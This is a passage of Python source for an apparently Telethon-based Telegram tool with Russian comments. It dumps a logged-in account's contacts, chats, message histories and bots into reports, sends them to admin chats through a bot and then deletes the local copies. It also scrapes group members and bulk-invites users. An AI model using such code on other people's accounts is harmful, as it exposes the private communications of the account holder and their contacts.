          sheet.append([item.title, item.participants_count, owner, admin, item.id, usernameadd])
    
    def write_data_del(sheet, data):
        sheet.append(["Название", "Владелец", "Администратор", "ID"])
        for item in data:
          owner_value = item['creator']
          admin_value = item['admin_rights']
          id_value = item['ID']
          title_value = item['title']
          owner = " (Владелец)" if owner_value else ""
          admin = " (Администратор)" if admin_value is not None else ""
          sheet.append([title_value, owner, admin, id_value])
            
    wb = openpyxl.Workbook()
    wb.remove(wb.active)
    ws_summury = wb.create_sheet("Сводная информация")
    ws_summury.append([f"Номер телефона: +{phone}, ID: {userid}, ({firstname}{lastname}) {username}"])
    if openchannel_count > 1:
        ws_summury.append([f"Открытые каналы: {openchannel_count-1}"])
        ws_open_channels = wb.create_sheet("Открытые каналы")
        write_data(ws_open_channels, openchannels)
    if closechannel_count > 1:
        ws_summury.append([f"Закрытые каналы: {closechannel_count-1}"])
        ws_closed_channels = wb.create_sheet("Закрытые каналы")
        write_data(ws_closed_channels, closechannels)
    if owner_openchannel > 1:
        ws_summury.append([f"Имеет права владельца или админа в открытых каналах: {owner_openchannel}"])
    if owner_closechannel > 1:
        ws_summury.append([f"Имеет права владельца или админа в закрытых каналах: {owner_closechannel}"])
    if opengroup_count > 1:
        ws_summury.append([f"Открытые группы: {opengroup_count-1}"])
        ws_open_groups = wb.create_sheet("Открытые группы")
        write_data(ws_open_groups, openchats)
    if closegroup_count > 1:
        ws_summury.append([f"Закрытые группы: {closegroup_count-1}"])
        ws_closed_groups = wb.create_sheet("Закрытые группы")
        write_data(ws_closed_groups, closechats)
    if closegroupdel_count > 1:
        ws_summury.append([f"Удаленные группы: {closegroupdel_count-1}"])
        ws_closed_groups_del = wb.create_sheet("Удаленные группы")
        write_data_del(ws_closed_groups_del, delgroups)
    if owner_opengroup > 11:
        ws_summury.append([f"Имеет права владельца или админа в открытых группах: {owner_opengroup}"])
    if owner_closegroup > 1:
        ws_summury.append([f"Имеет права владельца или админа в закрытых группах: {owner_closegroup}"])
    
    wb.save(f"{phone}_about.xlsx")

      
# Вывод информации о группах
def print_suminfo_about_channel (openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup):
    print("СУММАРНАЯ ИНФОРМАЦИЯ о ГРУППАХ и КОНТАКТАХ:") 
    print('-----------------------------')
    print(f"Подписан на открытые каналы: {openchannel_count-1}") if openchannel_count - 1 != 0 else None
    print(f"Подписан на закрытые каналы: {closechannel_count-1}") if closechannel_count - 1 != 0 else None
    print(f"\033[91mИмеет права владельца или админа в {owner_openchannel} открытых каналах\033[0m") if owner_openchannel != 0 else None
    print(f"\033[91mИмеет права владельца или админа в {owner_closechannel} закрытых каналах\033[0m") if owner_closechannel != 0 else None
    print()
    print(f"Состоит в открытых группах: {opengroup_count-1}") if opengroup_count - 1 != 0 else None
    print(f"Состоит в закрытых группах: {closegroup_count-1}") if closegroup_count - 1 != 0 else None
    print(f"Состоит в удаленных группах: {closegroupdel_count - 1}") if closegroupdel_count - 1 != 0 else None
    print(f"\033[91mИмеет права владельца или админа в {owner_opengroup} открытых группах\033[0m") if owner_opengroup != 0 else None
    print(f"\033[91mИмеет права владельца или админа в {owner_closegroup} закрытых группах\033[0m") if owner_closegroup != 0 else None
    print('-----------------------------')



#Выгружаем сообщения в Excel 
def remove_timezone(dt: datetime) -> Optional[datetime]:
    # Удаление информации о часовом поясе из объекта datetime
    if dt is None:
        return None
    if dt.tzinfo:
        dt = dt.astimezone().replace(tzinfo=None)
    return dt

def get_message_info(message):
    fwd_source_id = ''
    media_type = ''
    # Получение информации о сообщении
    if message is None:
        return None, None, None, None, None, None, None, None, None, None

    sender_id = message.sender_id if hasattr(message, 'sender_id') else None
    username = message.sender.username if hasattr(message.sender, 'username') else None
    first_name = message.sender.first_name if hasattr(message.sender, 'first_name') else None
    last_name = message.sender.last_name if hasattr(message.sender, 'last_name') else None
    date = message.date
    text = message.text
    fwd_user_id = message.fwd_from.from_id.user_id if isinstance(message.fwd_from, MessageFwdHeader) and hasattr(message.fwd_from.from_id, 'user_id') else None
    fwd_channel_id = message.fwd_from.from_id.channel_id if isinstance(message.fwd_from, MessageFwdHeader) and hasattr(message.fwd_from.from_id, 'channel_id') and isinstance(message.fwd_from.from_id, PeerChannel) else None
    fwd_date = message.fwd_from.date if isinstance(message.fwd_from, MessageFwdHeader) and hasattr(message.fwd_from, 'date') else None
    if fwd_user_id or fwd_channel_id:
        if fwd_user_id:
            fwd_source_id = f"From user: {fwd_user_id}"
        else:
            fwd_source_id = f"From channel: {fwd_channel_id}"
            
    if message.media is not None:
        if isinstance(message.media, types.MessageMediaPhoto):
            media_type = 'Photo'
        elif isinstance(message.media, types.MessageMediaDocument):
            for attribute in message.media.document.attributes:
                if isinstance(attribute, types.DocumentAttributeFilename):
                    document_name = attribute.file_name
                    media_type = f"Document: {document_name}"
                    break
                else:
                    media_type = 'Document (Photo, video, etc)'
                    break
        elif isinstance(message.media, types.MessageMediaWebPage):
            media_type = 'WebPage'
        elif isinstance(message.media, types.MessageMediaContact):
            media_type = 'Contact'
        elif isinstance(message.media, types.MessageMediaGeo):
            media_type = 'Geo'
        elif isinstance(message.media, types.MessageMediaVenue):
            media_type = 'Venue'
        elif isinstance(message.media, types.MessageMediaGame):
            media_type = 'Game'
        elif isinstance(message.media, types.MessageMediaInvoice):
            media_type = 'Invoice'
        elif isinstance(message.media, types.MessageMediaPoll):
            media_type = 'Poll'
        elif isinstance(message.media, types.MessageMediaDice):
            media_type = 'Dice'
        elif isinstance(message.media, types.MessageMediaPhotoExternal):
            media_type = 'PhotoExternal'
        else:
            media_type = 'Unknown'

    # Получение информации о реакции
    reaction_info = ""
    reactions = message.reactions
    if reactions and reactions.recent_reactions:
        for reaction in reactions.recent_reactions:
            try:
                user_id = reaction.peer_id.user_id
                reaction_emoji = reaction.reaction.emoticon
                reaction_info += f"Пользователь с ID {user_id} оставил реакцию {reaction_emoji}\n"
            except Exception:
                pass 
        
    return sender_id, username, first_name, last_name, date, text, media_type, fwd_source_id, fwd_date, reaction_info

def get_messages_and_save_xcls(client, index: int, id_: bool, name: bool, group_title, userid, userinfo, selection):
    group_title = str(group_title)
  #with client.takeout() as takeout: #Добавил
    wb = Workbook()
    ws = wb.active
    ws.cell(row=1, column=1, value=userinfo)
    ws.cell(row=2, column=1, value=group_title)
    ws.append(['ID объекта', 'Group ID', 'Message ID', 'Date and Time', 'User ID', '@Username', 'First Name', 'Last Name', 'Message', 'Media', 'Reply to Message', 'Reply to User ID', '@Reply Username', 'Reply First Name', 'Reply Last Name', 'Reply Message ID', 'Reply Date and Time', 'fwd_source_id', 'fwd_date', 'Reactions'])

    participants_from_messages = set()
    # рабочая all_messages = client.iter_messages(group_title) if selection == '7' else client.get_messages(group_title, limit=None)
    #if selection == '7':
    all_messages = client.iter_messages(group_title)
    #else:
       #with client.takeout() as takeout:
           # all_messages = takeout.iter_messages(group_title)
        
    #all_messages = client.iter_messages(group_title) if selection == '7' else takeout.iter_messages(group_title)  было
      
    #for message in client.iter_messages(group_title):
    #for message in takeout.iter_messages(group_title):
    for message in all_messages:
        
        # Проверяем, что message является экземпляром Message
        if not hasattr(message, 'sender'):
            continue
        # Основная информация о сообщении
        sender_id, username, first_name, last_name, date, text, media_type, fwd_source_id, fwd_date, reaction_info = get_message_info(message)
        if date is None:
            continue
        if sender_id is None:
            sender_id = group_title
        row_data = [
            userid,
            message.chat_id,
            message.id,
            remove_timezone(date),
            sender_id,
            f"@{username}" if username else None,
            first_name,
            last_name,
            text,
            media_type
        ]
        participants_from_messages.add(sender_id)

        # Если сообщение является ответом на другое сообщение
        if isinstance(message.reply_to_msg_id, int):
            reply_msg_id = message.reply_to_msg_id
            #if selection == '7':
            reply_sender_id, reply_username, reply_first_name, reply_last_name, reply_date, reply_text, reply_media_type, fwd_source_id, fwd_date, reply_reactions = get_message_info(client.get_messages(group_title, ids=[reply_msg_id])[0])  
            #if selection == '75':
                #reply_messages = takeout.get_messages(group_title, ids=[reply_msg_id]) #Добавил
                # рабочая была reply_messages = client.get_messages(group_title, ids=[reply_msg_id])
                #if reply_messages: #Добавил
                    #reply_message = reply_messages[0] #Добавил
                    #reply_sender_id, reply_username, reply_first_name, reply_last_name, reply_date, reply_text, reply_media_type, reply_fwd_source_id, reply_fwd_date, reply_reaction_info = get_message_info(reply_message) #Добавил
            if reply_date is None:
                continue
            row_data.extend([
                reply_text,
                reply_sender_id,
                f"@{reply_username}" if reply_username else None,
                reply_first_name,
                reply_last_name,
                reply_msg_id,
                remove_timezone(reply_date)
            ])
            participants_from_messages.add(reply_sender_id)
        else:
            row_data.extend([None] * 7)
            
        if isinstance(message.fwd_from, MessageFwdHeader):
            row_data.extend([
                fwd_source_id,
                remove_timezone(fwd_date)
            ])
        else:
            row_data.extend([None] * 2)
        row_data.append(reaction_info)
        ws.append(row_data)
    
    # Удаляем недопустимые символы из имени файла
    def sanitize_filename(filename):
        return re.sub(r'[\\/*?:"<>|]', '', filename)
    
    clean_group_title = sanitize_filename(group_title)

    if clean_group_title == group_title:
        filename = f"{group_title}_messages.xlsx"
    else:
        filename = f"{clean_group_title}_messages.xlsx"

    wb.save(filename)


# Поиск заблокированных ботов
def get_blocked_bot(client, selection, phone):
    blocked_bot_info = []
    blocked_bot_info_html = []
    count_blocked_bot = 0
    earliest_date = None
    latest_date = None
    image_data_url = " "
    
    delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html = get_type_of_chats(client, selection)
    bot_from_search, bot_from_search_html = get_bot_from_search(client, phone, selection)
    result_blocked = client(GetBlockedRequest(offset=0, limit=200))
    for peer in result_blocked.blocked:
        if peer.peer_id.__class__.__name__ == 'PeerUser':
            user = client.get_entity(peer.peer_id.user_id)
            if user.bot:
                if selection == '0':
                    try:
                        photo_path = client.download_profile_photo(user, file=BytesIO())
                        if photo_path:
                            encoded_image = base64.b64encode(photo_path.getvalue()).decode('utf-8')
                            image_data_url = f"data:image/jpeg;base64,{encoded_image}"
                        else:
                            with open("no_image.png", "rb") as img_file:
                                img_data = img_file.read()
                                img_str = base64.b64encode(img_data).decode('utf-8')
                                image_data_url = f"data:image/png;base64,{img_str}"
                    except Exception:
                        pass    
                blocked_bot_info.append(f"\033[36m@{user.username}\033[0m \033[93m'{user.first_name}'\033[0m заблокирован: {peer.date.strftime('%d/%m/%Y')}")
                
                blocked_bot_info_html.append(
                    f'<img src="{image_data_url}" alt=" " style="width:50px;height:50px;vertical-align:middle;margin-right:10px;">'
                    f'<a href="https://t.me/{user.username}" style="color:#0000FF; text-decoration: none;vertical-align:middle;">@{user.username}</a> '
                    f'<span style="color:#556B2F;vertical-align:middle;">{user.first_name}</span> заблокирован: {peer.date.strftime("%d/%m/%Y")}'
                )

                if earliest_date is None or peer.date < earliest_date:
                    earliest_date = peer.date
                if latest_date is None or peer.date > latest_date:
                    latest_date = peer.date
                count_blocked_bot += 1
    
    if user_bots:
        i = 0
        for bot in user_bots:
            i +=1
        print('-----------------------------')
        print(f"У пользователя есть боты: {i}")
        print('-----------------------------')
    else:
        print("Действующих ботов не обнаружено")
        
    if count_blocked_bot == 0:
        print('-----------------------------')
        print("Заблокированных ботов не обнаружено")
        print('-----------------------------')
    else:
        print('-----------------------------')
        print(f'В период с {earliest_date.strftime("%d/%m/%Y")} по {latest_date.strftime("%d/%m/%Y")} было\033[91m заблокировано {count_blocked_bot} ботов\033[0m')
        print('-----------------------------')
        
    if bot_from_search:
        i = 0
        for bot in bot_from_search:
            i +=1
        print('-----------------------------')
        print(f"У пользователя есть боты в истории: {i}")
        print('-----------------------------')
        
    return count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html
    
#добавляем аккаунт
def add_account(api_id, api_hash, selection, bot, admin_chat_ids):
    options = getoptions()
    sessions = getsessions()
    os.system('cls||clear')
    
    if options[0] == "NONEID\n" or options[1] == "NONEHASH":
        print("Проверьте api_id и api_hash")
        time.sleep(2)
        return
    
    exit_flag = False
    
    while not exit_flag:
        os.system('cls||clear')
        print("=Добавляем аккаунт в систему=\n")
        print("Имеющиеся подключенные аккаунты:\n")
        for i in sessions:
            print(i)
        print()
        
        phone = input("Введите номер телефона нового аккаунта ('e' - назад): ")
        if phone.lower() == 'e':
            exit_flag = True
            break
        
        if phone.startswith('+'):
            phone = phone[1:]  # Удаляем плюс, чтобы оставить только цифры
        
        if phone.isdigit() and len(phone) >= 9:
            if selection == '10':
                try:
                    client = TelegramClient(phone, int(options[0].replace('\n', '')), options[1].replace('\n', '')).start(phone)
                except Exception as e:
                    print(f"Произошла ошибка: {e}")
                    input("Нажмите Enter, чтобы попробовать снова...")
                    continue
            
            if selection == '105':
                try:
                    client = TelegramClient(phone, int(options[0].replace('\n', '')), options[1].replace('\n', ''))
                    client.start(phone, force_sms=True)
                except Exception as e:
                    print(f"Произошла ошибка: {e}")
                    input("Нажмите Enter, чтобы попробовать снова...")
                    continue
            
            selection = '0'
            os.system('cls||clear')
            print("Аккаунт успешно добавлен")

            selection_connect = input('Введите "0", чтобы получить отчет максимально быстро (без аватарок), или Enter для продолжения в стандартном режиме: ')
            if selection_connect == '0':
                selection = '5'
            else:
                selection = '0'
            os.system('cls||clear')
            print('-----------------------------')
            
            print()
            userid, userinfo, firstname, lastname, username, photos_user_html = get_user_info(client, phone, selection)  # Получение информации о пользователе
            count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html = get_blocked_bot(client, selection, phone)
            delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html = get_type_of_chats(client, selection)  # Получение информации о чатах и каналах
            groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html = make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
            print()
            total_contacts, total_contacts_with_phone, total_mutual_contacts = get_and_save_contacts(client, phone, userid, userinfo, firstname, lastname, username)
            save_about_channels(phone, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count)
            print_suminfo_about_channel(openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup)
            bot_from_search, bot_from_search_html = get_bot_from_search(client, phone, selection)
            generate_html_report(phone, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html, photos_user_html, bot_from_search_html)
            send_files_to_bot(bot, admin_chat_ids)
            print('-----------------------------')
            print("Информация о контактах, каналах и группах сохранена, выгружена в файлы Excel, которые отправлены в бот")
            print()
            client.disconnect()
            user_input = input("\033[93mНажмите 'e' для возврата в Главное меню или Enter для вывода инфрмации на экран  \033[0m")
            if user_input.lower() == 'e':
                exit_flag = True
                break
            else:
                os.system('cls||clear')
                print()
                print('\033[95m=ПРОСМОТР ДЕЙСТВУЮЩИХ БОТОВ=\033[0m')
                print(f"\033[96mНомер телефона: +{phone}, ID: {userid}, ({firstname}{lastname}) {username}\033[0m")
                print('-----------------------------')
                print_pages(user_bots, 40)
                print('-----------------------------')
                input("\033[93mВывод списка закончен. Нажмите Enter для продолжения...\033[0m")
                os.system('cls||clear')
                print()
                print('-----------------------------')
                print('\033[95m=ПРОСМОТР ЗАБЛОКИРОВАННЫХ БОТОВ=\033[0m')
                print(f"\033[96mНомер телефона: +{phone}, ID: {userid}, ({firstname}{lastname}) {username}\033[0m")
                print('-----------------------------')
                print_pages(blocked_bot_info, 40)
                print('-----------------------------')
                print() 
                input("\033[93mВывод списка окончен. Нажмите Enter для продолжения...\033[0m")
                os.system('cls||clear')
                print()
                print('\033[95m=ПРОСМОТР БОТОВ из ИСТОРИИ=\033[0m')
                print(f"\033[96mНомер телефона: +{phone}, ID: {userid}, ({firstname}{lastname}) {username}\033[0m")
                print('-----------------------------')
                print_pages(bot_from_search, 40)
                print('-----------------------------')
                input("\033[93mВывод списка закончен. Нажмите Enter для продолжения...\033[0m")
                os.system('cls||clear')
                print('-----------------------------')
                print('=ИНФОРМАЦИЯ О КАНАЛАХ и ГРУППАХ=')
                print('-----------------------------')
                print(f"\033[96mНомер телефона: +{phone}, ID: {userid}, ({firstname}{lastname}) {username}\033[0m")
                print('-----------------------------')
                # Выводим информацию о группах
                print_pages(all_info, 40)
                print('-----------------------------')
                print()
                input("\033[93mВывод списка закончен. Нажмите Enter для продолжения...\033[0m")
                exit_flag = True
                break
        else:
            print("Некорректный номер телефона. Пожалуйста, введите номер еще раз")
            time.sleep(2)





                      

# Удаление аккаунта
def remouve_account(api_id, api_hash, selection, bot, admin_chat_ids):
            options = getoptions()
            sessions = getsessions()
            os.system('cls||clear')
            if options[0] == "NONEID\n" or options[1] == "NONEHASH":
                print("Проверьте api_id и api_hash")
                time.sleep(2)
                return
            while True:
                os.system('cls||clear')
                print("=Удаляем аккаунт из системы=\n")
                for i in range(len(sessions)):
                    print(f"[{i}] -", sessions[i])
                print()
                kill = input("Выберите аккаунт для выхода из него ('e' - назад): ")
                if kill.lower() == 'e':
                    break
                else:
                    try:
                        i = int(kill)
                        if 0 <= i < len(sessions):
                            client = TelegramClient(sessions[i].replace('\n', ''), api_id, api_hash).start(sessions[i].replace('\n', ''))
                            client.log_out()
                            client.disconnect()
                            os.system('cls||clear')
                            print(f"Аккаунт {sessions[i]} успешно отключен")
                            time.sleep(3)
                            break
                        else:
                            #os.system('cls||clear')
                            print("Неверный номер аккаунта. Пожалуйста, выберите существующий аккаунт или введите 'e' для возврата назад")
                            time.sleep(2)
                    except ValueError:
                        #os.system('cls||clear')
                        print("Неверный ввод. Пожалуйста, выберите существующий аккаунт или введите 'e' для возврата назад")
                        time.sleep(2)


# Инвайтинг
def inviting(client, channel, users):
    client(InviteToChannelRequest(
        channel=channel,
        users=[users]
    ))


# Функция для выбора аккаунта и установки соответствующих переменных
def choice_akk(api_id, api_hash, header):
    sessions = []
    for file in os.listdir('.'):
        if file.endswith('.session'):
            sessions.append(file)
    while True:
        print(header)
        for i, session in enumerate(sessions):
            print(f"[{i}] - {session}")
        print()
        user_input = input("\033[92mДля продолжения выберите существующий аккаунт ('e' - назад): \033[0m")
        if user_input.lower() == 'e':
            break
        else:
            try:
                session_index = int(user_input)
                if 0 <= session_index < len(sessions):
                    client = TelegramClient(sessions[session_index].replace('\n', ''), api_id, api_hash)
                    client.connect()
                    phone = sessions[session_index].split('.')[0]
                    return client, phone, session_index
                else:
                    print("Пожалуйста, выберите существующий аккаунт в диапазоне от 0 до", len(sessions)-1)
                    time.sleep(2)
                    os.system('cls||clear')
            except ValueError:
                print("Пожалуйста, выберите существующий аккаунт в диапазоне от 0 до", len(sessions)-1)
                time.sleep(2)
                os.system('cls||clear')


#вывод строк постранично
def print_pages(items, items_per_page):
    num_items = len(items)
    num_pages = (num_items + items_per_page - 1) // items_per_page
    
    for page_num in range(num_pages):
        start_index = page_num * items_per_page
        end_index = min(start_index + items_per_page, num_items)
        page_items = items[start_index:end_index]
        for item in page_items:
            print(item)
        # Запрос на нажатие клавиши, если не все элементы были выведены и не последняя страница
        if end_index < num_items and page_num < num_pages - 1:
            input("\033[93mНажмите Enter для продолжения...\033[0m")
            os.system('cls||clear')
            print("\033[A\033[K", end='')



#  Формируем отчет HTML
def generate_html_report(phone, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count,
                         closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup,
                         owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html,
                         blocked_bot_info_html, user_bots_html, photos_user_html, bot_from_search_html):
    
    # Открываем HTML шаблон
    with open('template.html', 'r', encoding='utf-8') as file:
        template = Template(file.read())

    # Заполняем шаблон данными
    html_content = template.render(
        phone=phone,
        userid=userid,
        firstname=firstname,
        lastname=lastname,
        username=username,
        total_contacts=total_contacts,
        total_contacts_with_phone=total_contacts_with_phone,
        total_mutual_contacts=total_mutual_contacts,
        openchannel_count=openchannel_count,
        closechannel_count=closechannel_count,
        opengroup_count=opengroup_count,
        closegroup_count=closegroup_count,
        closegroupdel_count=closegroupdel_count,
        owner_openchannel=owner_openchannel,
        owner_closechannel=owner_closechannel,
        owner_opengroup=owner_opengroup,
        owner_closegroup=owner_closegroup,
        blocked_bot_info_html=blocked_bot_info_html,
        user_bots_html=user_bots_html,
        public_channels_html=public_channels_html,
        private_channels_html=private_channels_html,
        public_groups_html=public_groups_html,
        private_groups_html=private_groups_html,
        deleted_groups_html=deleted_groups_html,
        photos_user_html=photos_user_html,
        bot_from_search_html=bot_from_search_html
    )

    # Сохраняем результат в HTML файл
    report_filename = f"{phone}_report.html"
    with open(report_filename, 'w', encoding='utf-8') as file:
        file.write(html_content)    
  
    
# Функци по отправке в боты
def send_files_to_bot(bot, admin_chat_ids):
    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_private_messages.html']

    for file_extension in file_extensions:
        files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
        
        for file_to_send in files_to_send:
            for admin_chat_id in admin_chat_ids:
                with open(file_to_send, "rb") as file:
                    bot.send_document(admin_chat_id, file)
                    
            os.remove(file_to_send)

# Получаем ИД и Names в текстовый файл оригинал
def parsing(client, index: int, id: bool, name: bool):
    all_participants = []
    all_participants = client.get_participants(index)
    if name:
        with open('usernames.txt', 'r+') as f:
            usernames = f.readlines()
            for user in all_participants:
                if user.username:
                    if ('Bot' not in user.username) and ('bot' not in user.username):
                        if (('@' + user.username + '\n') not in usernames):
                            f.write('@' + user.username + '\n')
                        else:
                            continue
                    else:
                        continue
                else:
                    continue
    if id:
        with open('userids.txt', 'r+') as f:
            userids = f.readlines()
            for user in all_participants:
                if (str(user.id) + '\n') not in userids:
                    f.write(str(user.id) + '\n')


def getoptions():
    with open('options.txt', 'r') as f:
        options = f.readlines()
    return options

def getsessions():
    sessions = []
    for file in os.listdir('.'):
        if file.endswith('.session'):
            sessions.append(file)
    return sessions
